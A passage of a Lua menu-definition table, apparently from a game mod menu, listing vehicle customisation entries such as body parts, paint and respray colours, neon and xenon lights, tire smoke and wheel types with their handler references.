            {text = 'Exhaust', dkey = 'vehicle:customs_exhaust', desc = 'Change the vehicle\'s exhaust.', afu = __REAPER1__.M.vehicle.customs.vehiclemod, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle exhaust number', length = 1, tipus = 'szam', extra = 4, func = {'None'}},
            {text = 'Frame', dkey = 'vehicle:customs_frame', desc = 'Change the vehicle\'s frame.', afu = __REAPER1__.M.vehicle.customs.vehiclemod, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle frame number', length = 1, tipus = 'szam', extra = 5, func = {'None'}},
            {text = 'Grille', dkey = 'vehicle:customs_grille', desc = 'Change the vehicle\'s grille.', afu = __REAPER1__.M.vehicle.customs.vehiclemod, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle grille number', length = 1, tipus = 'szam', extra = 6, func = {'None'}},
            {text = 'Hood', dkey = 'vehicle:customs_hood', desc = 'Change the vehicle\'s hood.', afu = __REAPER1__.M.vehicle.customs.vehiclemod, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle hood number', length = 1, tipus = 'szam', extra = 7, func = {'None'}},
            {text = 'Fender', dkey = 'vehicle:customs_fender', desc = 'Change the vehicle\'s fender.', afu = __REAPER1__.M.vehicle.customs.vehiclemod, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle fender number', length = 1, tipus = 'szam', extra = 8, func = {'None'}},
            {text = 'Right fender', dkey = 'vehicle:customs_rightfender', desc = 'Change the vehicle\'s right fender.', afu = __REAPER1__.M.vehicle.customs.vehiclemod, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle right fender number', length = 1, tipus = 'szam', extra = 9, func = {'None'}},
            {text = 'Roof', dkey = 'vehicle:customs_roof', desc = 'Change the vehicle\'s roof.', afu = __REAPER1__.M.vehicle.customs.vehiclemod, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle roof number', length = 1, tipus = 'szam', extra = 10, func = {'None'}},
            {text = 'Livery', dkey = 'vehicle:customs_livery', desc = 'Change the vehicle\'s livery.', afu = __REAPER1__.M.vehicle.customs.vehiclemod, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle livery number', length = 1, tipus = 'szam', extra = 48, func = {'None'}},
            {text = 'Tank', dkey = 'vehicle:customs_tank', desc = 'Change the vehicle\'s tank.', afu = __REAPER1__.M.vehicle.customs.vehiclemod, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle tank number', length = 1, tipus = 'szam', extra = 45, func = {'None'}},
            {text = 'Benny\'s', option = __REAPER1__.M.Separator},
            {text = 'Plate holder', dkey = 'vehicle:customs_plateholder', desc = 'Change the vehicle\'s plate holder.', afu = __REAPER1__.M.vehicle.customs.vehiclemod, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle plate holder number', length = 1, tipus = 'szam', extra = 25, func = {'None'}},
            {text = 'Vanity plates', dkey = 'vehicle:customs_vanityplates', desc = 'Change the vehicle\'s vanity plates.', afu = __REAPER1__.M.vehicle.customs.vehiclemod, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle vanity plates number', length = 1, tipus = 'szam', extra = 26, func = {'None'}},
            {text = 'Trim', dkey = 'vehicle:customs_trim', desc = 'Change the vehicle\'s trim.', afu = __REAPER1__.M.vehicle.customs.vehiclemod, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle trim number', length = 1, tipus = 'szam', extra = 27, func = {'None'}},
            {text = 'Ornaments', dkey = 'vehicle:customs_ornaments', desc = 'Change the vehicle\'s ornaments.', afu = __REAPER1__.M.vehicle.customs.vehiclemod, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle ornaments number', length = 1, tipus = 'szam', extra = 28, func = {'None'}},
            {text = 'Dashboard', dkey = 'vehicle:customs_dashboard', desc = 'Change the vehicle\'s dashboard.', afu = __REAPER1__.M.vehicle.customs.vehiclemod, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle dashboard number', length = 1, tipus = 'szam', extra = 29, func = {'None'}},
            {text = 'Dial', dkey = 'vehicle:customs_dial', desc = 'Change the vehicle\'s dial.', afu = __REAPER1__.M.vehicle.customs.vehiclemod, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle dial number', length = 1, tipus = 'szam', extra = 30, func = {'None'}},
            {text = 'Door speaker', dkey = 'vehicle:customs_doorspeaker', desc = 'Change the vehicle\'s door speaker.', afu = __REAPER1__.M.vehicle.customs.vehiclemod, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle door speaker number', length = 1, tipus = 'szam', extra = 31, func = {'None'}},
            {text = 'Seats', dkey = 'vehicle:customs_seats', desc = 'Change the vehicle\'s seats.', afu = __REAPER1__.M.vehicle.customs.vehiclemod, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle seats number', length = 1, tipus = 'szam', extra = 32, func = {'None'}},
            {text = 'Steering wheel', dkey = 'vehicle:customs_steeringwheels', desc = 'Change the vehicle\'s steering wheels.', afu = __REAPER1__.M.vehicle.customs.vehiclemod, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle steering wheels number', length = 1, tipus = 'szam', extra = 33, func = {'None'}},
            {text = 'Shifter leavers', dkey = 'vehicle:customs_shifterleavers', desc = 'Change the vehicle\'s shifter leavers.', afu = __REAPER1__.M.vehicle.customs.vehiclemod, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle shifter leavers number', length = 1, tipus = 'szam', extra = 34, func = {'None'}},
            {text = 'Plaques', dkey = 'vehicle:customs_plaques', desc = 'Change the vehicle\'s plaques.', afu = __REAPER1__.M.vehicle.customs.vehiclemod, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle plaques number', length = 1, tipus = 'szam', extra = 35, func = {'None'}},
            {text = 'Speakers', dkey = 'vehicle:customs_speakers', desc = 'Change the vehicle\'s speakers.', afu = __REAPER1__.M.vehicle.customs.vehiclemod, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle speakers number', length = 1, tipus = 'szam', extra = 36, func = {'None'}},
            {text = 'Trunk', dkey = 'vehicle:customs_trunk', desc = 'Change the vehicle\'s trunk.', afu = __REAPER1__.M.vehicle.customs.vehiclemod, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle trunk number', length = 1, tipus = 'szam', extra = 37, func = {'None'}},
            {text = 'Hydraulics', dkey = 'vehicle:customs_hydraulics', desc = 'Change the vehicle\'s hydraulics.', afu = __REAPER1__.M.vehicle.customs.vehiclemod, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle hydraulics number', length = 1, tipus = 'szam', extra = 38, func = {'None'}},
            {text = 'Engine block', dkey = 'vehicle:customs_engineblock', desc = 'Change the vehicle\'s engine block.', afu = __REAPER1__.M.vehicle.customs.vehiclemod, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle engine block number', length = 1, tipus = 'szam', extra = 39, func = {'None'}},
            {text = 'Air filter', dkey = 'vehicle:customs_airfilter', desc = 'Change the vehicle\'s air filter.', afu = __REAPER1__.M.vehicle.customs.vehiclemod, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle air filter number', length = 1, tipus = 'szam', extra = 40, func = {'None'}},
            {text = 'Struts', dkey = 'vehicle:customs_struts', desc = 'Change the vehicle\'s struts.', afu = __REAPER1__.M.vehicle.customs.vehiclemod, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle struts number', length = 1, tipus = 'szam', extra = 41, func = {'None'}},
            {text = 'Arch cover', dkey = 'vehicle:customs_archcover', desc = 'Change the vehicle\'s arch cover.', afu = __REAPER1__.M.vehicle.customs.vehiclemod, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle arch cover number', length = 1, tipus = 'szam', extra = 42, func = {'None'}},
            {text = 'Aerials', dkey = 'vehicle:customs_aerials', desc = 'Change the vehicle\'s aerials.', afu = __REAPER1__.M.vehicle.customs.vehiclemod, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle aerials number', length = 1, tipus = 'szam', extra = 43, func = {'None'}},
            {text = 'Trim', dkey = 'vehicle:customs_trim2', desc = 'Change the vehicle\'s trim.', afu = __REAPER1__.M.vehicle.customs.vehiclemod, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle trim number', length = 1, tipus = 'szam', extra = 44, func = {'None'}},
        },
    
        ['vehicle:customs:respray'] = {
            {text = 'Enveff scale', dkey = 'vehicle:customs:respray_enveffscale', desc = 'The paint fade effect strength. 0 is\nfresh paint.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Enveff scale number', length = 4, tipus = 'vegyes', func = __REAPER1__.T.Float2},
            {text = 'Rainbow', dkey = 'vehicle:customs:respray_rainbow', desc = 'Rainbow primary and secondary colors.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Primary', option = __REAPER1__.M.Separator},
            {text = 'Custom', dkey = 'vehicle:customs:respray_custom', desc = 'Set the color of the primary color.\nFormat: r g b.', afu = __REAPER1__.M.vehicle.customs.respray.primaryc, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Primary color', length = 11, tipus = 'szin', menuextra = {r = 0, g = 0, b = 0}, func = '0 0 0'},
            {text = 'Chrome', dkey = 'vehicle:customs:respray_chrome', desc = 'Enable the chrome primary color.', afu = __REAPER1__.M.vehicle.customs.respray.primaryc2, option = __REAPER1__.M.Button},
            {text = 'Normal', dkey = 'vehicle:customs:respray_normal', desc = 'Normal primary color.', afu = __REAPER1__.M.vehicle.customs.respray.primary, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Normal primary color', length = 15, tipus = 'betu', extra = 0, func = __REAPER1__.T.VehNormal},
            {text = 'Metallic', dkey = 'vehicle:customs:respray_metallic', desc = 'Metallic primary color.', afu = __REAPER1__.M.vehicle.customs.respray.primary, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Metallic primary color', length = 15, tipus = 'betu', extra = 1, func = __REAPER1__.T.VehMetalic},
            {text = 'Pearl', dkey = 'vehicle:customs:respray_pearl', desc = 'Pearl primary color.', afu = __REAPER1__.M.vehicle.customs.respray.primary, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Pearl primary color', length = 15, tipus = 'betu', extra = 2, func = __REAPER1__.T.VehPearl},
            {text = 'Matte', dkey = 'vehicle:customs:respray_matte', desc = 'Matte primary color.', afu = __REAPER1__.M.vehicle.customs.respray.primary, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Matte primary color', length = 15, tipus = 'betu', extra = 3, func = __REAPER1__.T.VehMatte},
            {text = 'Metal', dkey = 'vehicle:customs:respray_metal', desc = 'Metal primary color.', afu = __REAPER1__.M.vehicle.customs.respray.primary, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Metal primary color', length = 15, tipus = 'betu', extra = 4, func = {'Brushed Steel', 'Brushed Black Steel', 'Brushed Aluminium', 'Pure Gold', 'Brushed Gold'}},
            {text = 'Secondary', option = __REAPER1__.M.Separator},
            {text = 'Custom', dkey = 'vehicle:customs:respray_scustom', desc = 'Set the color of the secondary color.\nFormat: r g b.', afu = __REAPER1__.M.vehicle.customs.respray.secondaryc, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Secondary color', length = 11, tipus = 'szin', menuextra = {r = 0, g = 0, b = 0}, func = '0 0 0'},
            {text = 'Chrome', dkey = 'vehicle:customs:respray_schrome', desc = 'Enable the chrome secondary color.', afu = __REAPER1__.M.vehicle.customs.respray.secondaryc2, option = __REAPER1__.M.Button},
            {text = 'Normal', dkey = 'vehicle:customs:respray_snormal', desc = 'Normal secondary color.', afu = __REAPER1__.M.vehicle.customs.respray.secondary, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Normal secondary color', length = 15, tipus = 'betu', extra = 0, func = __REAPER1__.T.VehNormal},
            {text = 'Metallic', dkey = 'vehicle:customs:respray_smetallic', desc = 'Metallic secondary color.', afu = __REAPER1__.M.vehicle.customs.respray.secondary, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Metallic secondary color', length = 15, tipus = 'betu', extra = 1, func = __REAPER1__.T.VehMetalic},
            {text = 'Pearl', dkey = 'vehicle:customs:respray_spearl', desc = 'Pearl secondary color.', afu = __REAPER1__.M.vehicle.customs.respray.secondary, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Pearl secondary color', length = 15, tipus = 'betu', extra = 2, func = __REAPER1__.T.VehPearl},
            {text = 'Matte', dkey = 'vehicle:customs:respray_smatte', desc = 'Matte secondary color.', afu = __REAPER1__.M.vehicle.customs.respray.secondary, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Matte secondary color', length = 15, tipus = 'betu', extra = 3, func = __REAPER1__.T.VehMatte},
            {text = 'Metal', dkey = 'vehicle:customs:respray_smetal', desc = 'Metal secondary color.', afu = __REAPER1__.M.vehicle.customs.respray.secondary, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Metal secondary color', length = 15, tipus = 'betu', extra = 4, func = {'Brushed Steel', 'Brushed Black Steel', 'Brushed Aluminium', 'Pure Gold', 'Brushed Gold'}},
            {text = 'Pearlescent', option = __REAPER1__.M.Separator},
            {text = 'Chrome', dkey = 'vehicle:customs:respray_pchrome', desc = 'Enable the chrome pearlescent color.', afu = __REAPER1__.M.vehicle.customs.respray.pearl2, option = __REAPER1__.M.Button},
            {text = 'Normal', dkey = 'vehicle:customs:respray_pnormal', desc = 'Normal pearlescent color.', afu = __REAPER1__.M.vehicle.customs.respray.pearl, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Normal pearlescent color', length = 15, tipus = 'betu', func = __REAPER1__.T.VehNormal},
            {text = 'Metallic', dkey = 'vehicle:customs:respray_pmetallic', desc = 'Metallic pearlescent color.', afu = __REAPER1__.M.vehicle.customs.respray.pearl, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Metallic pearlescent color', length = 15, tipus = 'betu', func = __REAPER1__.T.VehMetalic},
            {text = 'Pearl', dkey = 'vehicle:customs:respray_ppearl', desc = 'Pearl pearlescent color.', afu = __REAPER1__.M.vehicle.customs.respray.pearl, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Pearl pearlescent color', length = 15, tipus = 'betu', func = __REAPER1__.T.VehPearl},
            {text = 'Matte', dkey = 'vehicle:customs:respray_pmatte', desc = 'Matte pearlescent color.', afu = __REAPER1__.M.vehicle.customs.respray.pearl, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Matte pearlescent color', length = 15, tipus = 'betu', func = __REAPER1__.T.VehMatte},
            {text = 'Metal', dkey = 'vehicle:customs:respray_pmetal', desc = 'Metal pearlescent color.', afu = __REAPER1__.M.vehicle.customs.respray.pearl, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Metal pearlescent color', length = 15, tipus = 'betu', func = {'Brushed Steel', 'Brushed Black Steel', 'Brushed Aluminium', 'Pure Gold', 'Brushed Gold'}},
            {text = 'Wheels', option = __REAPER1__.M.Separator},
            {text = 'Chrome', dkey = 'vehicle:customs:respray_wchrome', desc = 'Enable the chrome wheel color.', afu = __REAPER1__.M.vehicle.customs.respray.wheelc2, option = __REAPER1__.M.Button},
            {text = 'Normal', dkey = 'vehicle:customs:respray_wnormal', desc = 'Normal wheel color.', afu = __REAPER1__.M.vehicle.customs.respray.wheel, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Normal wheel color', length = 15, tipus = 'betu', func = __REAPER1__.T.VehNormal},
            {text = 'Metallic', dkey = 'vehicle:customs:respray_wmetallic', desc = 'Metallic wheel color.', afu = __REAPER1__.M.vehicle.customs.respray.wheel, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Metallic wheel color', length = 15, tipus = 'betu', func = __REAPER1__.T.VehMetalic},
            {text = 'Pearl', dkey = 'vehicle:customs:respray_wpearl', desc = 'Pearl wheel color.', afu = __REAPER1__.M.vehicle.customs.respray.wheel, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Pearl wheel color', length = 15, tipus = 'betu', func = __REAPER1__.T.VehPearl},
            {text = 'Matte', dkey = 'vehicle:customs:respray_wmatte', desc = 'Matte wheel color.', afu = __REAPER1__.M.vehicle.customs.respray.wheel, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Matte wheel color', length = 15, tipus = 'betu', func = __REAPER1__.T.VehMatte},
            {text = 'Metal', dkey = 'vehicle:customs:respray_wmetal', desc = 'Metal wheel color.', afu = __REAPER1__.M.vehicle.customs.respray.wheel, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Metal wheel color', length = 15, tipus = 'betu', func = {'Brushed Steel', 'Brushed Black Steel', 'Brushed Aluminium', 'Pure Gold', 'Brushed Gold'}},
        },
    
        ['vehicle:customs:neonlights'] = {
            {text = 'Color', dkey = 'vehicle:customs:neonlights_color', desc = 'Set the color of the noen.\nFormat: r g b.', afu = __REAPER1__.M.vehicle.customs.neonlights.color, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Neon color', length = 11, tipus = 'szin', menuextra = {r = 0, g = 0, b = 0}, func = '0 0 0'},
            {text = 'Rainbow', dkey = 'vehicle:customs:neonlights_rainbow', desc = 'Rainbow neon color.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Toggle', option = __REAPER1__.M.Separator},
            {text = 'Left neon', dkey = 'vehicle:customs:neonlights_leftneon', desc = 'Toggle the left neon on the vehicle.', afu = __REAPER1__.M.vehicle.customs.neonlights.neon, option = __REAPER1__.M.Button, extra = 0},
            {text = 'Right neon', dkey = 'vehicle:customs:neonlights_rightneon', desc = 'Toggle the right neon on the vehicle.', afu = __REAPER1__.M.vehicle.customs.neonlights.neon, option = __REAPER1__.M.Button, extra = 1},
            {text = 'Front neon', dkey = 'vehicle:customs:neonlights_frontneon', desc = 'Toggle the front neon on the vehicle.', afu = __REAPER1__.M.vehicle.customs.neonlights.neon, option = __REAPER1__.M.Button, extra = 2},
            {text = 'Back neon', dkey = 'vehicle:customs:neonlights_backneon', desc = 'Toggle the back neon on the vehicle.', afu = __REAPER1__.M.vehicle.customs.neonlights.neon, option = __REAPER1__.M.Button, extra = 3},
        },
    
        ['vehicle:customs:xenonlights'] = {
            {text = 'Color', dkey = 'vehicle:customs:xenonlights_color', desc = 'The color of the xenon.', afu = __REAPER1__.M.vehicle.customs.xenonlights.color, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Xenon color number', length = 1, tipus = 'szam', func = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12}},
            {text = 'Random', dkey = 'vehicle:customs:xenonlights_random', desc = 'Random xenon color.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Toggle', option = __REAPER1__.M.Separator},
            {text = 'Enable xenon', dkey = 'vehicle:customs:xenonlights_enablexenon', desc = 'Enable the xenon lights on the vehicle.', afu = __REAPER1__.M.vehicle.customs.xenonlights.enable, option = __REAPER1__.M.Button},
            {text = 'Disable xenon', dkey = 'vehicle:customs:xenonlights_disablexenon', desc = 'Disable the xenon lights on the vehicle.', afu = __REAPER1__.M.vehicle.customs.xenonlights.disable, option = __REAPER1__.M.Button},
        },
    
        ['vehicle:customs:wheels'] = {
            {text = 'Bulletproof', dkey = 'vehicle:customs:wheels_bulletproof', desc = 'Toggle bulletproof tires.', afu = __REAPER1__.M.vehicle.customs.wheels.bulletproof, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Tire smoke', dkey = 'vehicle:customs:wheels_tiresmoke', desc = 'Toggle the tire smoke.', afu = __REAPER1__.M.vehicle.customs.togglevehiclemod, option = __REAPER1__.M.Checkbox, func = false, extra = 20},
            {text = 'Color', dkey = 'vehicle:customs:wheels_color', desc = 'Set the color of the tire smoke.\nFormat: r g b.', afu = __REAPER1__.M.vehicle.customs.wheels.color, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Tire smoke color', length = 11, tipus = 'szin', menuextra = {r = 0, g = 0, b = 0}, func = '0 0 0'},
            {text = 'Rainbow', dkey = 'vehicle:customs:wheels_rainbow', desc = 'Set rainbow tire smoke color.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Match', dkey = 'vehicle:customs:wheels_match', desc = 'Match the tire smoke color with the\nvehicle primary color.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Wheels', option = __REAPER1__.M.Separator},
            {text = 'Stock', dkey = 'vehicle:customs:wheels_stock', desc = 'Stock wheels.', afu = __REAPER1__.M.vehicle.customs.wheels.wheel, option = __REAPER1__.M.Button, extra = 23, extra2 = -1},
            {text = 'Sport', dkey = 'vehicle:customs:wheels_sport', desc = 'Sport wheels.', afu = __REAPER1__.M.vehicle.customs.wheels.wheel, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Sport wheel', length = 15, tipus = 'betu', extra = 23, extra2 = 0, func = {'Inferno', 'Deepfive', 'Lozspeed', 'Diamondcut', 'Chrono', 'Feroccirr', 'Fiftynine', 'Mercie', 'Syntheticz', 'Organictyped', 'Endov1', 'Duper7', 'Uzer', 'Groundride', 'Sracer', 'Vlocal', 'Cosmo', 'Dashvip', 'Icekid', 'Ruffweld', 'Wangenmaster', 'Superfive', 'Endov2', 'Slitsix'}},
            {text = 'Muscle', dkey = 'vehicle:customs:wheels_muscle', desc = 'Muscle wheels.', afu = __REAPER1__.M.vehicle.customs.wheels.wheel, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Muscle wheel', length = 15, tipus = 'betu', extra = 23, extra2 = 1, func = {'Classicfive', 'Dukes', 'Musclefreak', 'Kracka', 'Azrea', 'Mecha', 'Blacktop', 'Dragspl', 'Revolver', 'Classicrod', 'Fairlre', 'Spooner', 'Fivestar', 'Oldschool', 'Eljefe', 'Dodman', 'Sixgun', 'Mercenary'}},
            {text = 'Lowrider', dkey = 'vehicle:customs:wheels_lowrider', desc = 'Lowrider wheels.', afu = __REAPER1__.M.vehicle.customs.wheels.wheel, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Lowrider wheel', length = 15, tipus = 'betu', extra = 23, extra2 = 2, func = {'Flare', 'Wired', 'Triplegolds', 'Bigworm', 'Sevenfives', 'Splitsix', 'Freshmesh', 'Leadsled', 'Turbine', 'Superfin', 'Classicrod', 'Dollar', 'Dukes', 'Lowfive', 'Gooch'}},
            {text = 'Suv', dkey = 'vehicle:customs:wheels_suv', desc = 'Suv wheels.', afu = __REAPER1__.M.vehicle.customs.wheels.wheel, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Suv wheel', length = 15, tipus = 'betu', extra = 23, extra2 = 3, func = {'Vip', 'Benefactor', 'Cosmo', 'Bippu', 'Royalsix', 'Fagorme', 'Deluxe', 'Icedout', 'Cognscenti', 'Lozspeedten', 'Supernova', 'Obeyrs', 'Lozspeedballer', 'Extravaganzo', 'Splitsix', 'Empowered', 'Sunrise', 'Dashvip', 'Cutter'}},
            {text = 'Off-road', dkey = 'vehicle:customs:wheels_off-road', desc = 'Off-road wheels.', afu = __REAPER1__.M.vehicle.customs.wheels.wheel, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Off-road wheel', length = 15, tipus = 'betu', extra = 23, extra2 = 4, func = {'Raider', 'Mudslinger', 'Nevis', 'Cairngorm', 'Amazon', 'Challenger', 'Dunebasher', 'Fivestar', 'Rockcrawler', 'Milspecsteelie'}},
            {text = 'Tuner', dkey = 'vehicle:customs:wheels_tuner', desc = 'Tuner wheels.', afu = __REAPER1__.M.vehicle.customs.wheels.wheel, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Tuner wheel', length = 15, tipus = 'betu', extra = 23, extra2 = 5, func = {'Cosmo', 'Supermesh', 'Outsider', 'Rollas', 'Driffmeister', 'Slicer', 'Elquatro', 'Dubbed', 'Fivestar', 'Slideways', 'Apex', 'Stancedeg', 'Countersteer', 'Endov1', 'Endov2dish', 'Guppez', 'Chokadori', 'Chicane', 'Saisoku', 'Dishedeight', 'Fujiwara', 'Zokusha', 'Battlevlll', 'Rallymaster'}},
            {text = 'Bike', dkey = 'vehicle:customs:wheels_bike', desc = 'Bike wheels.', afu = __REAPER1__.M.vehicle.customs.wheels.wheel, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Bike wheel', length = 15, tipus = 'betu', extra = 23, extra2 = 6, func = {'Speedway', 'Streetspecial', 'Racer', 'Trackstar', 'Overlord', 'Trident', 'Triplethreat', 'Stilleto', 'Wires', 'Bobber', 'Solidus', 'Iceshield', 'Loops'}},
            {text = 'High end', dkey = 'vehicle:customs:wheels_highend', desc = 'High end wheels.', afu = __REAPER1__.M.vehicle.customs.wheels.wheel, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'High end wheel', length = 15, tipus = 'betu', extra = 23, extra2 = 7, func = {'Shadow', 'Hypher', 'Blade', 'Diamond', 'Supagee', 'Chromaticz', 'Merciechlip', 'Obeyrs', 'Gtchrome', 'Cheetahr', 'Solar', 'Splitten', 'Dashvip', 'Lozspeedten', 'Carboninferno', 'Carbonshadow', 'Carbonz', 'Carbonsolar', 'Carboncheetahr', 'Carbonsracer'}},
            {text = 'Back Bike Wheels', option = __REAPER1__.M.Separator},
            {text = 'Stock', dkey = 'vehicle:customs:wheels_bstock', desc = 'Stock back wheels.', afu = __REAPER1__.M.vehicle.customs.wheels.wheel, option = __REAPER1__.M.Button, extra = 24, extra2 = -1},
            {text = 'Sport', dkey = 'vehicle:customs:wheels_bsport', desc = 'Sport back wheels.', afu = __REAPER1__.M.vehicle.customs.wheels.wheel, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Sport back wheel', length = 15, tipus = 'betu', extra = 24, extra2 = 0, func = {'Inferno', 'Deepfive', 'Lozspeed', 'Diamondcut', 'Chrono', 'Feroccirr', 'Fiftynine', 'Mercie', 'Syntheticz', 'Organictyped', 'Endov1', 'Duper7', 'Uzer', 'Groundride', 'Sracer', 'Vlocal', 'Cosmo', 'Dashvip', 'Icekid', 'Ruffweld', 'Wangenmaster', 'Superfive', 'Endov2', 'Slitsix'}},
            {text = 'Muscle', dkey = 'vehicle:customs:wheels_bmuscle', desc = 'Muscle back wheels.', afu = __REAPER1__.M.vehicle.customs.wheels.wheel, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Muscle back wheel', length = 15, tipus = 'betu', extra = 24, extra2 = 1, func = {'Classicfive', 'Dukes', 'Musclefreak', 'Kracka', 'Azrea', 'Mecha', 'Blacktop', 'Dragspl', 'Revolver', 'Classicrod', 'Fairlre', 'Spooner', 'Fivestar', 'Oldschool', 'Eljefe', 'Dodman', 'Sixgun', 'Mercenary'}},
            {text = 'Lowrider', dkey = 'vehicle:customs:wheels_blowrider', desc = 'Lowrider back wheels.', afu = __REAPER1__.M.vehicle.customs.wheels.wheel, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Lowrider back wheel', length = 15, tipus = 'betu', extra = 24, extra2 = 2, func = {'Flare', 'Wired', 'Triplegolds', 'Bigworm', 'Sevenfives', 'Splitsix', 'Freshmesh', 'Leadsled', 'Turbine', 'Superfin', 'Classicrod', 'Dollar', 'Dukes', 'Lowfive', 'Gooch'}},
            {text = 'Suv', dkey = 'vehicle:customs:wheels_bsuv', desc = 'Suv back wheels.', afu = __REAPER1__.M.vehicle.customs.wheels.wheel, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Suv back wheel', length = 15, tipus = 'betu', extra = 24, extra2 = 3, func = {'Vip', 'Benefactor', 'Cosmo', 'Bippu', 'Royalsix', 'Fagorme', 'Deluxe', 'Icedout', 'Cognscenti', 'Lozspeedten', 'Supernova', 'Obeyrs', 'Lozspeedballer', 'Extravaganzo', 'Splitsix', 'Empowered', 'Sunrise', 'Dashvip', 'Cutter'}},
            {text = 'Off-road', dkey = 'vehicle:customs:wheels_boff-road', desc = 'Off-road back wheels.', afu = __REAPER1__.M.vehicle.customs.wheels.wheel, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Off-road back wheel', length = 15, tipus = 'betu', extra = 24, extra2 = 4, func = {'Raider', 'Mudslinger', 'Nevis', 'Cairngorm', 'Amazon', 'Challenger', 'Dunebasher', 'Fivestar', 'Rockcrawler', 'Milspecsteelie'}},
